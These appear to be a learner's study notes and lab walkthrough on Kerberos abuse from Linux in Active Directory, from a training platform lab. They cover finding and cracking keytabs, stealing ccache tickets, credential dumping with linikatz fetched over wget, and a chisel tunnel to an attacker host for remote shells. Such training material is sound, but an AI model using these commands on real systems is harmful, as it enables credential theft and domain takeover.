- Although not common, **Linux computers can connect to Active Directory to provide centralized identity management and integrate with the organization's systems**, giving users the ability to have a single identity to authenticate on Linux and Windows computers.

**Note:** A Linux machine not connected to Active Directory could use Kerberos tickets in scripts or to authenticate to the network. It is not a requirement to be joined to the domain to use Kerberos tickets from a Linux machine.

# Kerberos on Linux
---
- Windows and Linux use the **same process to request a Ticket Granting Ticket (TGT) and Service Ticket (TGS)**. However, how they **store the ticket information may vary depending** on the Linux distribution and implementation.
- In most cases, Linux machines **store Kerberos tickets as [ccache files](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) in the `/tmp` directory.**
- By default, the **==location of the Kerberos ticket is stored in the environment variable `KRB5CCNAME`==**
- These [ccache files](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) are **==protected by specific read/write permissions, but a user with elevated privileges==** or root privileges **could easily gain access to these tickets.**
  
## KeyTab Files
- Another everyday use of Kerberos in Linux is with [keytab](https://kb.iu.edu/d/aumh) files. **A [keytab](https://kb.iu.edu/d/aumh) is a file ==containing pairs of Kerberos principals and encrypted keys (which are derived from the Kerberos password).**==
- You can use a keytab file to **authenticate to various remote systems using Kerberos** without entering a password.
- [Keytab](https://kb.iu.edu/d/aumh) files commonly **allow scripts to authenticate automatically using Kerberos without requiring human interaction or access to a password** stored in a plain text file. 
	- For example, a script can use a keytab file to access files stored in the Windows share folder.
- **Note:** Any computer that has a Kerberos client installed can create keytab files. Keytab files can be created on one computer and copied for use on other computers because they are not restricted to the systems on which they were initially created.

## Linux auth via port forward
---
- `ssh david@inlanefreight.htb@10.129.204.23 -p 2222`
- Our Machine -> MS01 -> LINUX01 (with kerberos)

# Identifying Linux and Active Directory integration
---
- We can identify if the Linux machine is domain-joined using **[realm](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/windows_integration_guide/cmd-realmd), a tool used to manage system enrollment in a domain** and set which domain users or groups are allowed to access the local system resources.
## realm - Check if Linux machine is domain-joined
- `realm list`
	- ![[Pasted image 20250704070817.png]]
- The output of the command indicates that the **machine is configured as a Kerberos member**.
- In case [realm](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/windows_integration_guide/cmd-realmd) is not available, we can also look for **other tools** used to integrate Linux with Active Directory **such as [sssd](https://sssd.io/) or [winbind](https://www.samba.org/samba/docs/current/man-html/winbindd.8.html).**

## PS - Check if Linux machine is domain-joined
- `ps -ef | grep -i "winbind\|sssd"`
- ![[Pasted image 20250704071655.png]]

# Finding Kerberos tickets in Linux
---
- Kerberos tickets can be found in **different places depending on the Linux implementation or the administrator** changing default settings. 

## Finding KeyTab files
- A straightforward approach is to **use `find` to search** for files whose name contains the word `keytab`.
- It should (not necessary) have `.keytab` extension
	- `find / -name *keytab* -ls 2>/dev/null`
	- ![[Pasted image 20250704071759.png]]
	- **Note:** To use a keytab file, we must have read and write (rw) privileges on the file.

## Identifying KeyTab files in Cronjobs
- Another way to find `KeyTab` files **is in automated scripts configured using a cronjob** or any other Linux service.
	- `crontab -l`
	- ![[Pasted image 20250704071928.png]]
- In the above script, we notice the use of [kinit](https://web.mit.edu/kerberos/krb5-1.12/doc/user/user_commands/kinit.html), which means that Kerberos is in use.
- **[kinit](https://web.mit.edu/kerberos/krb5-1.12/doc/user/user_commands/kinit.html) allows interaction with Kerberos, and its function is to request the user's TGT and store this ticket in the cache (ccache file)**. We can use `kinit` to import a `keytab` into our session and act as the user.


**Note:** Linux domain-joined machine needs a ticket to interact with the AD environment. 
**==The ticket is represented as a keytab file located by default at `/etc/krb5.keytab`==** and can only be read by the root user. 
If we gain access to this ticket, ==**we can impersonate the computer account LINUX01$.INLANEFREIGHT.HTB**==


# Finding ccache files
---
- A credential cache or ==**[ccache](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) file holds Kerberos credentials while they remain valid**== and, generally, while the user's session lasts.
- Once a user authenticates to the domain, a ccache file is created that **stores the ticket information**.
- The **==path to this file is placed in the `KRB5CCNAME` environment variable.==**

## Reviewing environment variables for ccache files.
- `env | grep -i krb5`
	- ![[Pasted image 20250704072252.png]]
- As mentioned previously, `ccache` files are located, by default, at `/tmp`.
- If we gain access **==as root or a privileged user, we would be able to impersonate a user using their `ccache` file while it is still valid.==**
- ![[Pasted image 20250704072334.png]]

# Abusing KeyTab files
---
- The first thing we can do is impersonate a user using `kinit`. 
- To use a keytab file, **==we need to know which user it was created for.==** 
- `klist` is another application used to interact with Kerberos on Linux. **This application reads information from a `keytab` file.** Let's see that with the following command:
	- `klist -k -t /opt/specialfiles/carlos.keytab`
	- ![[Pasted image 20250704073329.png]]
- The ticket corresponds to the user Carlos. 
- We can now impersonate the user with `kinit`. **Let's confirm which ticket we are using with `klist` and then import Carlos's ticket into our session with `kinit`.**
- **Note:** **kinit** is **case-sensitive**, so be sure to ==**use the name of the principal as shown in klist.**== In this case, the username is lowercase, and the domain name is uppercase.

## Impersonating a user with a KeyTab
- `klist`
- `kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab`
- ![[Pasted image 20250704073432.png]]
- We can attempt to **access the shared folder `\\dc01\carlos` to confirm our access.**
  
- **Note:** To **keep the ticket from the current session, before importing the keytab, save a copy of the ccache file present in the environment variable `KRB5CCNAME`.**

## KeyTab Extract
---
- The second method we will use to abuse Kerberos on Linux is **==extracting the secrets from a keytab file==**.
- If we want to gain access to Carlos's account on the Linux machine, **we'll need his password.**
- We can attempt to crack the account's password by **extracting the hashes from the keytab file**. Let's use [KeyTabExtract](https://github.com/sosdave/KeyTabExtract), **a tool to extract valuable information from 502-type `.keytab` files,**

- Extracting KeyTab hashes with KeyTabExtract:
	- `python3 keytabextract.py /opt/specialfiles/carlos.keytab `
	- ![[Pasted image 20250704073821.png]]
- With the NTLM hash, **we can perform a Pass the Hash attack**.
- With the AES256 or AES128 hash, **==we can forge our tickets using Rubeus or attempt to crack the hashes to obtain the plaintext password.==**
  
- **Note:** A KeyTab file can contain different types of hashes and **can be merged to contain multiple credentials even from different users.**
- The most straightforward hash to crack is the NTLM hash. **We can use tools like [Hashcat](https://hashcat.net/) or [John the Ripper](https://www.openwall.com/john/) to crack it.**

### **Obtaining more hashes**
- Carlos has a **==cronjob that uses a KeyTab file named `svc_workstations.kt`. We can repeat the process==**, crack the password, and log in as `svc_workstations`.

# Abusing KeyTab ccache
---
- To abuse a ccache file, all **we need is READ privileges on the file.** 
- These files, **==located in `/tmp`, can only be read by the user who created them,==** but if we gain **root acces**s, we could use them.
- Once we log in with the credentials for the user `svc_workstations`, we can use `sudo -l` and confirm that the user can execute any command as root. We can use the `sudo su` command to change the user to root.

## Privilege escalation to root
- `ssh svc_workstations@inlanefreight.htb@10.129.204.23 -p 2222`
- `sudo -l`
	- ![[Pasted image 20250705054539.png]]
- As **root**, we need to identify **==which tickets are present on the machine, to whom they belong, and their expiration time.==**

## Looking for ccache files:
- `ls -la /tmp`
- ![[Pasted image 20250705054616.png]]

- There is one user (julio@inlanefreight.htb) **to whom we have not yet gained access. We can confirm the groups to which he belongs using `id`**.
	- `id julio@inlanefreight.htb`
	- `uid=647401106(julio@inlanefreight.htb) gid=647400513(domain users@inlanefreight.htb) groups=647400513(domain users@inlanefreight.htb),647400512(domain admins@inlanefreight.htb),647400572(denied rodc password replication group@inlanefreight.htb)`
	
- Julio is a **==member of the `Domain Admins` group==**. We can attempt to **impersonate the user and gain access to the `DC01` Domain Controller host.**
- To use a ccache file, **we can copy the ccache file and assign the file path to the `KRB5CCNAME` variable.**

## Importing the ccache file into our current session
- `klist`
- `cp /tmp/krb5cc_647401106_I8I133 .`
- `export KRB5CCNAME=/root/krb5cc_647401106_I8I133`
- `klist`
	- ![[Pasted image 20250705054810.png]]

- **Note:** klist displays the ticket information. **==We must consider the values "valid starting" and "expires." If the expiration date has passed, the ticket will not work. `ccache files` are temporary.**==

# Using Linux attack tools with Kerberos
---
- Many Linux attack tools that interact with Windows and Active Directory support Kerberos authentication. 
- If we use them from a domain-joined machine, **we need to ensure our `KRB5CCNAME` environment variable is set to the ccache file** we want to use.
- In this scenario, **our attack host doesn't have a connection to the `KDC/Domain Controller`, and we can't use the Domain Controller for name resolution.**
- To use Kerberos, **we need to proxy our traffic via `MS01` with a tool such as [Chisel](https://github.com/jpillora/chisel) and [Proxychains](https://github.com/haad/proxychains) and edit the `/etc/hosts` file to hardcode IP addresses of the domain and the machines we want to attack.**

- ![[Pasted image 20250705055225.png]]

- Connect to MS01 with xfreerdp:
	- `xfreerdp /v:10.129.204.23 /u:david /d:inlanefreight.htb /p:Password2 /dynamic-resolution`
- Execute chisel from MS01:
	- `c:\tools\chisel.exe client 10.10.14.33:8080 R:socks`
	- **Note:** The client IP is your attack host IP.
- Finally, we need **to transfer Julio's ccache file from `LINUX01` and create the environment variable `KRB5CCNAME` with the value corresponding to the path of the ccache file.**

- Setting the KRB5CCNAME environment variable:
	- `export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133`

# Impacket
---
- To use the Kerberos ticket, **we need to specify our target machine name** (not the IP address) **and use the option `-k`**. If we get a prompt for a password, **we can also include the option `-no-pass`.**
- Using Impacket with proxychains and Kerberos authentication:
	- `proxychains impacket-wmiexec dc01 -k`
- **Note:** If you are using Impacket tools from a Linux machine connected to the domain, note that some Linux Active Directory implementations use the FILE: prefix in the KRB5CCNAME variable. If this is the case, we need to modify the variable only to include the path to the ccache file.

# Evil-WinRM
---
- To use [evil-winrm](https://github.com/Hackplayers/evil-winrm) with Kerberos, **we need to install the Kerberos package** used for network authentication.
- For some Linux like Debian-based (Parrot, Kali, etc.), **it is called `krb5-user`**
- . While installing, **we'll get a prompt for the Kerberos realm. Use the domain name: `INLANEFREIGHT.HTB`, and the KDC is the `DC01`**
- Installing Kerberos authentication package:
	- `sudo apt-get install krb5-user -y`
	- ![[Pasted image 20250705060343.png]]
	- In case the package `krb5-user` is already installed, we need to change **the configuration file `/etc/krb5.conf` to include the following values:**
		- ![[Pasted image 20250705060402.png]]
- Using Evil-WinRM with Kerberos:
	- `proxychains evil-winrm -i dc01 -r inlanefreight.htb`
	- ![[Pasted image 20250705060420.png]]

# Miscellaneous
---
- If we want to use a **==`ccache file` in Windows or a `kirbi file` in a Linux machine,==** we can use [impacket-ticketConverter](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketConverter.py) to convert them. 
- To use it, we specify the file we want to convert and the output filename. Let's convert Julio's ccache file to kirbi:
	- ` impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi`
- We can do the reverse operation by first selecting a `.kirbi file`. Let's use the `.kirbi` file in Windows:
	- `C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi`

# Linikatz
---
- [Linikatz](https://github.com/CiscoCXSecurity/linikatz) is a tool created by Cisco's security team for **==exploiting credentials on Linux machines when there is an integration with Active Directory.==** 
- In other words, Linikatz brings a similar principle to **`Mimikatz` to UNIX environments.**
- Just like `Mimikatz`, to take advantage of Linikatz, **we need to be root on the machine.** 
- This tool will extract all credentials, including Kerberos tickets, from different Kerberos implementations such as FreeIPA, SSSD, Samba, Vintella, etc.
- Once it extracts the credentials, **it places them in a folder whose name starts with `linikatz.`**

## Linikatz download and execution:
- `wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh`
- `/opt/linikatz.sh`
	- ![[Pasted image 20250705060647.png]]

# Labs
---
=> Which group can connect to LINUX01?
- `realm list`
- ![[Pasted image 20250705061613.png]]

=> Look for a keytab file that you have read and write access. Submit the file name as a response. 
- `find / -name *keytab* 2>/dev//null`

=> Extract the hashes from the keytab file you found, crack the password, log in as the user and submit the flag in the user's home directory. 
- `scp -P 2222 david@inlanefreight.htb@10.129.204.23:/opt/specialfiles/carlos.keytab .`
- `python3 /opt/PNPT-Tools/tools/keytabextract.py carlos.keytab`
	- ![[Pasted image 20250705061935.png]]
- `hashcat -a 0 -m 1000 carlos.hash /usr/share/wordlists/rockyou.txt`
	- ![[Pasted image 20250705062040.png]]
- `su carlos@inlanefreight.htb`

=> Check Carlos' crontab, and look for keytabs to which Carlos has access. Try to get the credentials of the user svc_workstations and use them to authenticate via SSH. Submit the flag.txt in svc_workstations' home directory. 
	![[Pasted image 20250705062214.png]]
	![[Pasted image 20250705064441.png]]
- ` python3 /opt/PNPT-Tools/tools/keytabextract.py svc_workstations._all.kt`
- `hashcat -m 1000 -a 0 svc_work.hash /usr/share/wordlists/rockyou.txt`![[Pasted image 20250705064529.png]]
- `cd /home/svc_workstations@inlanefreight.htb/`

=> Get Root Access with `sudo su`

=>  Check the /tmp directory and find Julio's Kerberos ticket (ccache file). Import the ticket and read the contents of julio.txt from the domain share folder \\DC01\julio. 
- `ls -lah /tmp | grep julio`
	- ![[Pasted image 20250705065313.png]]
	- One of these **==were expired, so have to check both using `klist`==**
	- ![[Pasted image 20250705065346.png]]
- `smbclient //dc01/julio -k -no-pass`

=> Use the LINUX01$ Kerberos ticket to read the flag found in \\DC01\linux01. Submit the contents as your response (the flag starts with Us1nG_).
- Impersonate as LINUX joined machine using its keytab file which is used to interact with AD env.
	- `kinit LINUX01$ -k -t /etc/krb5.keytab`
	- `smbclient //DC01/linux01 -k --no-pass`